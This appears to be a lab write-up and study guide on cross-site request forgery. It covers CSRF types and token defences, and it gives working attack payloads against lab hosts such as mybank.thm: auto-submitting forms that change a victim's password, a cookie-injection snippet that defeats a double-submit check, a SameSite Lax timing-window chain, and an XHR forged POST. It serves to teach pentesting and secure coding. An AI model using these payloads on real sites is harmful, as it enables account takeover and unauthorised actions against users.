# Cross-site request forgery (CSRF)

CSRF (Cross-Site Request Forgery) is a vulnerability where an attacker forces a victim’s browser to send unauthorized requests to an application where the victim is already authenticated. Since browsers automatically include cookies, the application treats the request as legitimate.

**Core idea:** exploit trust between browser ↔ authenticated session.

**Phases:**

1. Attacker crafts a malicious request (link, form, script).
2. Victim interacts with it while authenticated (cookies auto-attached).
3. Application fails to verify request authenticity → action executed.

**Impact:**

* Unauthorized actions (transactions, account changes)
* Abuse of user trust
* Silent execution (no malware required, hard to detect)

---

## 1. Types of CSRF

### 1.1 Traditional CSRF

Targets state-changing actions via forged form submissions. The victim unknowingly submits a request that includes valid session data (cookies, parameters).

![Traditional CSRF](/img/CSRF/1.svg)

**Flow:**

* Victim is logged into a target site (e.g., banking app)
* Attacker sends a crafted link or embeds a malicious form
* Victim clicks/loads it in same browser session
* Browser sends authenticated request → action executed (e.g., fund transfer)

### 1.2 XMLHttpRequest CSRF (AJAX-based)

Targets modern applications using asynchronous requests (XHR / Fetch). No full page reload needed, but the trust model is identical.

**Typical scenario:**

* Victim is logged into `mailbox.thm`
* Attacker hosts a page with malicious JavaScript
* Script sends a forged request (e.g., POST `/api/updateEmail`)
* Browser includes session cookie automatically
* Server processes request if no CSRF protection → settings modified

**Key point:** Same attack, just using background requests instead of forms.

### 1.3 Flash-based CSRF

Uses malicious `.swf` files to send unauthorized requests. Historically relevant due to weak security in **Adobe Flash Player**.

* Flash enabled cross-domain request abuse
* Attackers embedded malicious Flash objects to trigger actions
* Could perform authenticated requests similar to traditional CSRF

Flash support ended on **December 31, 2020**, so this mainly matters for legacy systems still clinging to outdated tech like it’s 2008.

---

## 2. Basic CSRF - Hidden Link/Image Exploitation

Hidden link/image exploitation is a CSRF technique where an attacker embeds a nearly invisible element (e.g., 0×0 image or disguised link) that triggers a request on behalf of an authenticated user. Since browsers automatically include cookies, the request is treated as legitimate.

```html
<!-- Website --> 
<a href="https://mybank.thm/transfer.php" target="_blank">Click Here</a>  
<!-- User visits attacker's website while authenticated -->
```

This attack relies on:

* Active authenticated sessions
* Automatic credential inclusion (cookies)
* Social engineering to trigger interaction

### 2.1 How it Works

* Victim is logged into multiple services in the same browser session (e.g., `mailbox.thm`, `mybank.thm`)
* Attacker identifies a target endpoint (e.g., fund transfer) with weak or no CSRF protection
* Application accepts requests without verifying origin or intent

**Example vulnerable form:**

```html
<form action="transfer.php" method="post">

    <label for="to_account">To Account:</label>
    <input type="text" id="to_account" name="to_account" required>

    <label for="amount">Amount:</label>
    <input type="number" id="amount" name="amount" required>

    <button type="submit">Transfer</button>
</form>
```

* No anti-CSRF mechanism present
* Request depends solely on session cookies

**Attack delivery (social engineering):**

![email](/img/CSRF/2.png)

```html
<a href="http://mybank.thm:8080/dashboard.php?to_account=GB82MYBANK5698&amount=1000" target="_blank">
    Click Here to Redeem
</a>
```

* Victim clicks the link while authenticated
* Browser sends request with session cookies
* Server processes it as a legitimate action

**Note:** It is a simplified example; real-world attacks are usually less obvious and may use hidden elements instead of visible links.

### 2.2 Root Cause

* Server does not verify whether the request originated from a trusted source
* No mechanism to distinguish legitimate user actions from forged requests

### 2.3 Securing the Breach

**Pentester perspective:**

* Identify all state-changing endpoints (GET/POST)
* Check for presence/absence of CSRF tokens
* Attempt forged requests from external origins (no token / invalid token / replay)

**Secure coding perspective (Session-based CSRF protection):**

* Enforce CSRF protection on all sensitive actions
* Bind each request to a user session via a unique, unpredictable token
* Do not rely on cookies or session alone for validation

**Implementation (Session-based token):**

```html
<form method="post" action="transfer.php">
    <label for="password">Password:</label>
    <input type="password" id="password" name="current_password" required>

    <label for="confirm_password">Confirm Password:</label>
    <input type="password" id="confirm_password" name="confirm_password" required>

    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

    <button type="submit" name="password_submit">Update Password</button>
</form>
```

```php
session_start();

// Generate token if not present
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Validate token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF validation failed");
}
```

* Token is generated server-side and tied to session
* Each request must include the valid token
* Invalid or missing tokens → request rejected

### 2.4 CSRF Protection: Double Submit Cookie (and Misconfiguration)

**Concept:**

* Server generates a CSRF token
* Token is sent to the client in two ways:

  * As a cookie (`csrf_token`)
  * Included in the request (hidden field/header)
* Server verifies both values match

```html
<form method="post" action="transfer.php">
    <label for="password">Password:</label>
    <input type="password" id="password" name="current_password" required>

    <label for="confirm_password">Confirm Password:</label>
    <input type="password" id="confirm_password" name="confirm_password" required>

    <!-- Token mirrored from cookie into request -->
    <input type="hidden" name="csrf_token" value="<?php echo $_COOKIE['csrf_token']; ?>">

    <button type="submit" name="password_submit">Update Password</button>
</form>
```

> **Note:** When using `<?php echo $_COOKIE['csrf_token']; ?>`, the process happens in a strict sequence: first, the browser sends a request to the server along with its cookies; next, the server receives this request and reads the cookie value from `$_COOKIE`; then, while generating the response, PHP executes and embeds that cookie value into the HTML (for example, inside a hidden input field); finally, the server sends the fully rendered HTML to the browser, which only sees static content and has no awareness of PHP. So even though it looks like the client is copying the cookie into the form, it is actually the server reusing a value that originally came from the client, which is why this approach becomes insecure if the cookie can be predicted or injected.

```php
session_start();

// Generate token if not already set in cookie
if (empty($_COOKIE['csrf_token'])) {
    $token = bin2hex(random_bytes(32));
    setcookie('csrf_token', $token, [
        'httponly' => false,
        'secure' => true,
        'samesite' => 'Strict'
    ]);
    $_COOKIE['csrf_token'] = $token;
}

// Validate token (cookie vs request)
if (
    !isset($_POST['csrf_token'], $_COOKIE['csrf_token']) ||
    !hash_equals($_COOKIE['csrf_token'], $_POST['csrf_token'])
) {
    die("CSRF validation failed");
}
```

**Assumption:**

* Attacker cannot read cookies (Same-Origin Policy)
* Attacker cannot inject or overwrite cookies
* Token is random and unpredictable

**Important nuances:**

* The hidden field typically mirrors the cookie value — this is expected in Double Submit Cookie
* Security relies on the attacker **not being able to control or predict the cookie value**
* If the cookie is attacker-controlled, both values can be forged
* `SameSite=Strict` reduces CSRF risk but does not replace validation
* If **XSS exists**, token can be read → protection collapses

#### Common Misconfigurations (Exploitable)

1. Token only in cookie (no comparison)

   * Cookie auto-sent → no real protection

2. Predictable or reversible token

   * Token derived from user data → can be forged

3. Cookie injection (subdomain control)

   * Attacker sets cookie → controls CSRF token

4. Token accessible via JavaScript (XSS)

   * Token theft → bypass

#### Pentester Notes

* Check if token exists in both **cookie and request**
* Tamper one value → observe validation behavior
* Accepted mismatch → broken implementation
* Analyze token randomness (decode / pattern check)
* Test subdomain cookie injection
* Combine with XSS if token is readable client-side

---

## 3. Double Submit Cookies Bypass

CSRF tokens significantly improve security, but incorrect implementation can introduce new attack vectors. The Double Submit Cookie mechanism relies on comparing a token sent in both a cookie and a request parameter. If the attacker can **predict or control this token**, the protection can be bypassed.

### 3.1 How it works

* **Token Generation:** Server generates a CSRF token and sends it:

  * As a cookie (`csrf-token`)
  * Mirrored into request fields (hidden input/header)

* **User Action:** User submits a form containing the CSRF token

* **Form Submission:** Token is sent in both cookie and request

* **Server Validation:** Server verifies both values match

**Key assumption:** attacker cannot predict or control the token value.

### 3.2 Possible Vulnerable Scenarios

* **Predictable Token Generation:** Token derived from user data (e.g., account number)
* **Subdomain Cookie Injection:** Attacker sets cookies for parent domain
* **XSS Exposure:** Token readable via JavaScript
* **Weak Session Binding:** Token not tied to session/user
* **MITM / Insecure Transport:** Token leakage over network

In this scenario, multiple weaknesses are combined.

### 3.3 Exploitation

The attack chains two issues:

1. **Predictable CSRF token**
2. **Ability to inject cookies via subdomain** (attacker controls a subdomain in this scenario)

**Vulnerable form:**

```html
<form method="post" action="">
        <label for="password">Password:</label>
        <input type="password" id="password" name="new_password" required>

        <label for="confirm_password">ConfirmPassword:</label>
        <input type="password" id="confirm_password" name="confirm_password" required>
        <input type="hidden" id="csrf_token" name="csrf_token" value="<?php echo $_COOKIE['csrf-token']; ?>">
        <button type="submit" name="password_submit" >Update Password</button>
    </form>submit">
</form> 
```

* The server-side application mirrors the CSRF token from the cookie into the request parameter
* Security depends entirely on token strength and cookie integrity

**Recon:**

![Browser's Inspect](/img/CSRF/3.png)

* Cookies identified:

  * `csrf-token`
  * `PHPSESSID`

![CyberChef](/img/CSRF/4.png)

* CSRF token decodes to **bank account number** → predictable and reversible

**Key weakness:**

* Token = `base64(account_number)`
* No randomness or session binding

#### Attack Strategy

* Generate valid CSRF token using victim’s account number
* Craft malicious request with that token

Double Submit Cookie validation:

```txt
cookie_value == request_value
```

So both values must match.

![Malicious Email to bypass Double Submit Cookies](/img/CSRF/5.png)

#### Payload

```html
<form method="post" action="http://mybank.thm:8080//changepassword.php" id="autos">
        <label for="password">Password:</label>
        <input type="password" id="password" name="current_password" value="<?php echo "GB82MYBANK5697" ?>" required>

        <label for="confirm_password">ConfirmPassword:</label>
        <input type="password" id="confirm_password" name="confirm_password" value="Attacker Unique Password" required>
        <input type="hidden" id="csrf_token" name="csrf_token" value="BASE64_ENCODED_ACCOUNT">

        <button type="submit" name="password_submit"  id="password_submit" >Update Password</button>
    </form>
    </div>
<script>
document.getElementById('password_submit').click(); 
</script>
```

#### Cookie Injection (Reliability Step)

```php
<?php
...
setcookie(
    'csrf-token',               
    base64_encode("GB82MYBANK5699"),            
    [
        'expires' => time() + (365 * 24 * 60 * 60), 
        'path' => '/',                         
        'domain' => 'mybank.thm',                          
        'secure' => false,                      
        'httponly' => false,                 
        'samesite' => 'Lax' 
    ]
);
?>
```

* Forces cookie value to match forged request
* Removes dependency on victim’s existing cookie

**Note:**
Since the token is fully predictable, cookie injection is not strictly required here, but ensures deterministic success.

#### Server-side validation

```php
<?php
if (base64_decode($_POST["csrf_token"]) == base64_decode($_COOKIE['csrf-token'])) { 
$currentPassword = $_POST["current_password"];
$newPassword = $_POST["confirm_password"];
// Update Password
...;
```

* Both values become attacker-controlled
* Validation passes due to equality

### 3.4 Flaws

* Predictable, reversible token
* No session binding
* Cookie injection possible via subdomain
* Server trusts client-controlled values

### 3.5 Key Takeaway

Double Submit Cookie fails if:

* Token is predictable
* Token is reversible
* Cookie can be injected

```txt
attacker_value == attacker_value
```

→ validation always passes → CSRF protection collapses

---

## 4. Same-site Cookie bypass

SameSite is a cookie attribute that controls when cookies are included in cross-site requests. It helps mitigate CSRF by restricting cookie transmission based on request context.

SameSite reduces CSRF risk but does not replace proper CSRF protection.

### 4.1 Different Types of SameSite Cookies

* **Lax:**
  Cookies are sent in top-level navigations and safe HTTP methods (GET, HEAD, OPTIONS).
  Not included in cross-site POST requests.
  Still included in cross-site GET → exploitable if sensitive actions use GET.

* **Strict:**
  Cookies are only sent in same-origin requests.
  Effectively prevents CSRF via cross-site requests.
  May break legitimate cross-origin functionality.

* **None:**
  Cookies are sent in both first-party and cross-site requests.
  Must use `Secure` (HTTPS).
  Provides no CSRF protection on its own.

### 4.2 Exploitation — Lax

* Attacker already has control over the victim’s account (from earlier attack)
* Goal: force logout to prevent user interference
* Target: `logout` cookie set with `SameSite=Lax`

![displaying logout cookie via browser's inspect](/img/CSRF/6.png)

* Server validates the cookie and logs out the user based on its value:

```php
<?php
$cookieNames = array_keys($_COOKIE);
if($_COOKIE["logout"] == "xxxxxxx"){
// Loop through each cookie and delete it
foreach ($cookieNames as $cookieName) {
// If it's desired to kill the session, also delete the session cookie.
session_destroy();
..
...
}
```

* Logout depends on cookie value
* Since `SameSite=Lax`, the cookie is sent in top-level GET requests
* Attack delivery: attacker sends a phishing email (e.g., fake survey)

![showing malicious email](/img/CSRF/7.png)

* Payload:

```html
<a href="https://mybank.thm:8080/logout.php" target="_blank">Survey Link!</a>
```

* Execution:
  * Victim clicks link
  * Browser sends GET request to `logout.php`
  * `logout` cookie is included (allowed by Lax)
  * Server validates cookie → logs user out
* Result: victim is logged out without awareness

#### Flaws

* Sensitive action exposed via GET
* No CSRF protection
* Reliance on cookie value alone
* Inappropriate use of `SameSite=Lax`
* If set to `Strict`, the cookie would not be sent in cross-site requests

---

### 4.3 Lax with POST Scenario - Chaining the Exploit

As a pentester, always analyze cookie attributes. In the previous case, `SameSite=Lax` allowed exploitation via GET. Normally, this blocks cross-site POST requests.

Initially, browsers required explicit SameSite configuration. If not set, cookies behaved like `None`. Modern browsers (e.g., Chrome) default unspecified cookies to `SameSite=Lax`, allowing:

* First-party requests
* Top-level GET navigations
* Blocking most cross-site POST requests

However, there is an exception.

From Chrome’s behavior:

> Cookies set without SameSite in the last 2 minutes are sent with top-level cross-site POST requests.

So, newly set or modified cookies behave like `SameSite=None` for ~2 minutes, then revert to Lax.

After reviewing the application, an `isBanned` cookie is set post-login. Its value determines whether the user is banned.

**Objective:** modify the `isBanned` cookie via CSRF.

**Server-side logic:**

```php
if (!isset($_COOKIE['isBanned'])) { 
    echo('&#60;script&#62;alert("isBanned cookie not found in request");&#60;/script&#62;');
    exit();
    }
if (isset($_POST['isBanned'])) {
    $status=$_POST['isBanned'];
    echo('<script>document.cookie="isBanned='.$status.'";</script>'); 
}
```

* POST `/index.php` accepts `isBanned`
* Server requires the cookie to already exist
* Prevents simple CSRF (cookie missing in cross-site request)

![malicious email for Lax](/img/CSRF/8.png)

If a cross-site POST is sent directly:

```html
<script>
function launchAttack(){ setTimeout(function(){bank.submit()},1000)
}
</script>
<form style="display:none" name="bank" 
method=post action="http://mybank.thm:8080/index.php">
<input name="isBanned" value="true">
<input type="submit">
</form>
```

**Result:**

![browser error showing isBanned cookie not found](/img/CSRF/9.png)

* Cookie not included → request rejected

**Bypass Strategy (Lax + 2-minute window):**

* Cookies are sent with cross-site POST if **recently modified (<2 min)**
* `isBanned` updates during:

  * Login
  * Logout

So, trigger a cookie update, then immediately exploit the window.

**Attack chain:**

1. Force victim to hit `/logout.php` → updates cookie
2. Within 2 minutes, send POST request to `/index.php`
3. Browser includes cookie → bypass restriction

**Payload:**

```html
<script>
function launchAttackSuccess(){
let win = window.open("http://mybank.thm:8080/logout.php",'');
setTimeout(function(){win.close();bank.submit()},1000)
}
</script>
<form style="display:none" name="bank" 
method=post action="http://mybank.thm:8080/index.php">
<input name="isBanned" value="true">
<input type="submit">
</form> 
```

**Execution:**

* Victim triggers attack
* Logout request updates `isBanned` cookie
* Within ~2 minutes, POST request is sent
* Browser includes cookie (exception window)
* Server accepts request → cookie value modified

*Result:* CSRF succeeds despite `SameSite=Lax` by chaining state change + timing window.

---

## 5. Few Additional Exploitation Techniques

### 5.1 XMLHttpRequest Exploitation

In AJAX contexts, CSRF still forces a victim’s browser to send authenticated requests without user intent. Same-Origin Policy (SOP) restricts reading responses, **not sending requests**, so CSRF remains viable.

**Example:**

```html id="7y4c7q"
<script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://mybank.thm/updatepassword', true);
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                alert("Action executed!");
            }
        };
        xhr.send('action=execute&parameter=value');
    </script>
```

* Sends authenticated POST request via victim’s browser
* Cookies are automatically included
* SOP prevents response access, but request execution still succeeds

**Key point:** CSRF does not require reading responses, only triggering requests.

### 5.2 Same Origin Policy (SOP) and Cross-Origin Resource Sharing (CORS) Bypass

CORS defines which origins can send cross-origin requests. Misconfigurations can allow attackers to bypass origin restrictions and perform authenticated actions.

```php
<?php // Server-side code (PHP)
 header('Access-Control-Allow-Origin: *'); 
// Allow requests from any origin (vulnerable CORS configuration) .
..// code to update email address ?>
```

* `Access-Control-Allow-Origin: *` allows any origin
* If sensitive actions are exposed without CSRF protection → exploitable

**Important:**

* `Access-Control-Allow-Origin: *` + sensitive endpoints = risk
* Credentials should only be allowed for trusted origins
* `Access-Control-Allow-Origin: *` **cannot** be used with `Access-Control-Allow-Credentials: true`

**Pentester focus:**

* Check allowed origins (`*`, reflected origins, regex bypass)
* Test if credentials are accepted in cross-origin requests
* Identify state-changing endpoints exposed via CORS

### 5.3 Referer Header Bypass

Some applications validate the `Referer` header to prevent CSRF by checking request origin.

**Weakness:**

* `Referer` can be:

  * Omitted (privacy settings, extensions)
  * Modified (proxies, client control)

* Applications that:

  * Only check presence (not strict match)
  * Accept empty/missing values

→ become vulnerable

**Key point:** `Referer` is unreliable as a standalone CSRF defense.

---
